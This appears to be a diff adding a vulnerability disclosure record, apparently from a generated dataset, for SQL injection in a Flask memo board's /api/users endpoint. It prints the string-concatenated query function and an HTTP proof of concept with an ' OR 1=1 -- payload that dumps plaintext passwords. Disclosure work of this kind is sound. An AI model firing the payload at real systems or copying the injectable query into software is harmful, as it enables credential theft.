@@ -1,0 +1,114 @@
+{
+  "dataType": "CVE_RECORD",
+  "dataVersion": "5.2",
+  "cveMetadata": {
+    "cveId": "VULNHUNTER_PENDING",
+    "assignerOrgId": "d745fec1-a142-45ad-8db6-5b688e786db6",
+    "requesterUserId": "00000000-0000-4000-9000-000000000000",
+    "serial": 1,
+    "state": "PUBLISHED"
+  },
+  "containers": {
+    "cna": {
+      "x_theConversation": [
+        {
+          "authorRole": "CNA-LR",
+          "visibility": "public"
+        }
+      ],
+      "x_Read_Landing": {
+        "x_Acknowledge": "NO"
+      },
+      "x_Other_CNA": {
+        "x_CNA_Contact": "IN-CNA-LR-SCOPE"
+      },
+      "x_Request_Type": {
+        "x_Publication_Request": "NO"
+      },
+      "providerMetadata": {
+        "orgId": "d745fec1-a142-45ad-8db6-5b688e786db6"
+      },
+      "problemTypes": [
+        {
+          "descriptions": [
+            {
+              "lang": "en",
+              "description": "CWE-89 Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
+              "type": "CWE"
+            }
+          ]
+        }
+      ],
+      "affected": [
+        {
+          "x_CopyOfCNAUnderAffected": "IN-CNA-LR-SCOPE",
+          "versions": [
+            {
+              "status": "affected",
+              "version": "0.5.0"
+            }
+          ],
+          "defaultStatus": "unaffected"
+        }
+      ],
+      "descriptions": [
+        {
+          "lang": "en",
+          "value": "MemoBoard (pip package memoboard) version 0.5.0 is a Flask intranet memo board.\nIt is affected by SQL injection (CWE-89) because src/board/engine.py run_user_lookup() concatenates the caller-supplied name into a SELECT that also projects the password column, skipping the intended parameterized query.\nAttack chain: an unauthenticated GET to /api/users (source: query parameter name in src/app.py api_users) reaches the sink conn.execute(sql) in run_user_lookup without sanitization on the default deployment.\nVulnerable code in src/board/engine.py:\ndef run_user_lookup(name: str) -> list[dict]:\n    # String-concatenated SQL. `name` is a query parameter.\n    sql = f\"SELECT id, name, role, email, password FROM users WHERE name = '{name}'\"\n    with _connect() as conn:\n        rows = conn.execute(sql).fetchall()\n    return [dict(r) for r in rows]\nHTTP PoC:\nGET /api/users?name=' OR 1=1 -- HTTP/1.1\nHost: TARGET:5000\nAccept: application/json\nConnection: close\nImpact: a remote unauthenticated attacker can dump all users' plaintext passwords, including the administrator account. Remaining control: none on the default install; this demonstration is read-only disclosure via a single SQLite statement.\n",
+          "supportingMedia": [
+            {
+              "type": "text/html",
+              "base64": false,
+              "value": "<p>MemoBoard (pip package memoboard) version 0.5.0 is a Flask intranet memo board.</p><p>It is affected by SQL injection (CWE-89) because src/board/engine.py run_user_lookup() concatenates the caller-supplied name into a SELECT that also projects the password column, skipping the intended parameterized query.</p><p>Attack chain: an unauthenticated GET to /api/users (source: query parameter name in src/app.py api_users) reaches the sink conn.execute(sql) in run_user_lookup without sanitization on the default deployment.</p><p>Vulnerable code in <code>src/board/engine.py</code>:</p><pre>def run_user_lookup(name: str) -&gt; list[dict]:\n    # String-concatenated SQL. `name` is a query parameter.\n    sql = f\"SELECT id, name, role, email, password FROM users WHERE name = '{name}'\"\n    with _connect() as conn:\n        rows = conn.execute(sql).fetchall()\n    return [dict(r) for r in rows]</pre><pre>GET /api/users?name=' OR 1=1 -- HTTP/1.1\nHost: TARGET:5000\nAccept: application/json\nConnection: close</pre><p>Impact: a remote unauthenticated attacker can dump all users' plaintext passwords, including the administrator account. Remaining control: none on the default install; this demonstration is read-only disclosure via a single SQLite statement.</p>"
+            }
+          ]
+        }
+      ],
+      "references": [
+        {
+          "url": "https://github.com/1diot9/VulnHunter-White/blob/main/data/projects/11/src/SECURITY.md"
+        }
+      ],
+      "metrics": [
+        {
+          "format": "CVSS",
+          "scenarios": [
+            {
+              "lang": "en",
+              "value": "GENERAL"
+            }
+          ],
+          "cvssV4_0": {
+            "version": "4.0",
+            "attackVector": "NETWORK",
+            "attackComplexity": "LOW",
+            "attackRequirements": "NONE",
+            "privilegesRequired": "NONE",
+            "userInteraction": "NONE",
+            "vulnConfidentialityImpact": "HIGH",
+            "subConfidentialityImpact": "NONE",
+            "vulnIntegrityImpact": "NONE",
+            "subIntegrityImpact": "NONE",
+            "vulnAvailabilityImpact": "NONE",
+            "subAvailabilityImpact": "NONE",
+            "Safety": "NOT_DEFINED",
+            "Automatable": "NOT_DEFINED",
+            "Recovery": "NOT_DEFINED",
+            "valueDensity": "NOT_DEFINED",
+            "vulnerabilityResponseEffort": "NOT_DEFINED",
+            "providerUrgency": "NOT_DEFINED",
+            "baseSeverity": "HIGH",
+            "baseScore": 8.7,
+            "vectorString": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"
+          }
+        }
+      ],
+      "source": {
+        "discovery": "UNKNOWN"
+      },
+      "x_generator": {
+        "engine": "CVE-Request-form 0.0.1"
+      }
+    }
+  }
+}
